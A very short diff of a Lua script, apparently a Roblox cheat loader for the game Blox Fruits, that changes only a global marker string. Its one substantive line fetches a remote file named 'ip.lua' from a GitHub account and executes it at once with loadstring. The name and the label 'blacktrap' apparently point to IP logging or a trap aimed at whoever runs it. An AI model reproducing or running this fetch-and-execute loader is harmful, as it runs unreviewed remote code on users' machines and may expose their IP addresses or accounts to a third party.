@@ -1,4 +1,4 @@
-_G.script_executed = "blox-fruits_blacktrap"
+_G.script_executed = "blox-fruits_blacktrap.lua"
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/main/copy/ip.lua'))()
 
